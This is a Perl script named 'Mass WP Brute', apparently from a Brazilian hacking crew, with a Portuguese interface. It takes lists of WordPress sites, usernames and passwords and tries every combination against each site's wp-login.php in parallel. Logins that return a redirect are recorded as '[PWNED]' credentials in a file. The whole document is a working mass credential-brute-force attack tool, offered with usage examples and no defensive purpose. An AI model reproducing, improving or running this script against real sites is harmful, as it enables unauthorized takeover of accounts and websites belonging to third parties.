#!/usr/bin/perl
# Mass WP Brute
# Coder by v4p0r 
# Date: 1 NOV 2017    12:23
# Greetz: YC - HighTech - EOF Club - Brian - d3m0l1d0r - Cater - Strike - rCent
#         Kodo - Pato Loko - xin0x - mmxm - d3z3n0v3 - c0de_universal - All Friends

use strict;
use Getopt::Long;
use WWW::Mechanize;
use Parallel::ForkManager;

my $distro; 
my $usr = $^O;

if ( $usr eq "MSWin32") {
    system("cls");
} else {
    system("clear");
}

my (@splitar, @users, @sites, @pass, $site, $pm, $fm, $optListSites, 
    $optListUsers, $optListPass, $optProcess, $optSave, $optHelp, $Save, $p);

my $banner = @ARGV;
print "\n-------------------------\n" .
      "      WP BRUTE FORCE      \n" .
      "-------------------------\n";

GetOptions(
    'list-site|l=s' => \$optListSites,
    'list-user|u=s' => \$optListUsers,
    'list-pass|p=s' => \$optListPass,
    'list-save|s=s' => \$optSave,
    'process|f=s'   => \$optProcess,
    'help|h'        => \$optHelp
);

if ($optSave) {
      $Save = $optSave;
} else {
      $Save = "wp-checked.txt";
}
if ($optProcess) {
      $p = $optProcess;
} else {
      $p = 20;
}
if ($optHelp) { 
    &banner;
}
        
if($banner <= 1) {

    print "\nCoder: v4p0r\n" .
    "Team: Yunkers Crew && BRLZ PoC\n" .
    "Twitter: 0x777null" .
    "Skype: drx.priv\n\n" .
    "Usage: perl $0 --help\n";
    exit;

}
        
my $fm = $pm = Parallel::ForkManager-> new($p);

open my $list, "< $optListSites" or die "[LIST-SITE NAO DEFINIDA]\n";
open my $list2, "< $optListUsers" or die "[LIST-USER NAO DEFINIDA]\n";
open my $list3, "< $optListPass"  or die "[LIST-PASS NAO DEFINIDA]\n";
open my $outfile, "> $optSave";

while (<$list>) {
    chomp($_);
    push @sites,$_;
}

while (<$list2>) {
    chomp($_);
    push @users,$_;
}

while (<$list3>) {
    chomp($_);
    push @pass,$_;
}

print "\n"."[PROCESSOS]: " . $p . "\n";
print "[LISTA SALVA EM]: " . $Save . "\n";
print "[TOTAL SITES]: " . scalar(@sites) . "\n";
print "[TOTAL USERS]: " . scalar(@users) . "\n";
print "[TOTAL SENHAS]: " . scalar(@pass) . "\n\n";
tempo();
print "[TESTANDO A LISTA AGUARDE]" . "\n\n";

foreach $site (@sites) {
    foreach my $user (@users) {
        foreach my $pass (@pass) {
            push @splitar, "$site|$user|$pass"; 
        }
    }
}

foreach my $splitar1 (@splitar) {

    $fm->start and next;
    my ($site, $usuario, $senha) = split/[|]/, $splitar1;
    
    if ($site !~ /^http:\/\//) {
        $site = "http://" . $site;
    } else {
        $site = "https://" . $site;
    }

    if ($site !~ /\/wp-login.php/) {
        $site = $site . "/wp-login.php";
    }
    
    my $useragent = new LWP::UserAgent;
    my $resposta = $useragent->post($site, [
        log => $usuario,
        pwd => $senha,
        'wp-submit' => "Log in",
    ]);
 
    my $cracked = $resposta->code;

    if($cracked =~ /302/){
        tempo();
        print "[PWNED]: " . $site . " | " . $usuario . " | " . $senha . "\n";
        open(my $fh, '>>', $Save);
        print $fh "[PWNED]: " . $site . " | " . $usuario . " | " . $senha . "\n";
        close $fh;
    }
    $fm->finish();
    
}

sub tempo {

  my ($segundos, $minutos, $hora) = localtime();
  print "[";
  print "$hora:$minutos:$segundos";
  print "]";

}

sub banner {

print q{============================================================
                                                   ,   ,
  ,    ,    /\   /\                               /(   )\
 /( /\ )\  _\ \_/ /_    Simples Mass WP Brute v2  \ \_/ /   , /\ ,
 |\_||_/| < \_   _/ >   Criado                    /_   _\  /| || |\
 \______/  \|0   0|/          Por                | \> </ | |\_||_/|
   _\/_   _(_  ^  _)_             v4p0r          (_  ^  _)  \____/
  ( () ) /`\|V"""V|/`\                         /`\|IIIII|/`\ _\/_
    {}   \  \_____/  /  Date: 01 NOV 20        \  \_____/  /  ()
    ()   /\   )=(   /\  Gretz: YC - HighTech   /\   )=(   /\  ()
    {}  /  \_/\=/\_/  \         All Friends   /  `-.\=/.-'  \ ()
============================================================};
print "\nUsage: $0 [comando]" .
          "[+] Comandos:\n" .
          "--help         [Ajuda com os comandos]\n" .
          "--list-site|l  [Seleciona sua lista de sites]\n" .
          "--list-user|u  [Seleciona sua lista de user]\n" .
          "--list-pass|p  [Seleciona sua lista de pass]\n" .
          "--list-save|s  [Onde a lista sera salva]\n" .
          "--process|f    [Quantidade de Processos]\n" .
          "               [Defaut 20]\n\n" .
          "[!] Exemplos:\n" .
          "perl $0 --l sites.txt --u user.txt --p pass.txt --f 100\n" .
          "perl $0 --l sites.txt --u user.txt --p pass.txt --f 100 --s cracked.txt\n" .
          "perl $0 --list-site sites.txt --list-user user.txt --list-pass pass.txt --process 100\n" .
          "perl $0 --list-site sites.txt --list-user user.txt --list-pass pass.txt --process 100 --s cracked.txt\n";
exit;

}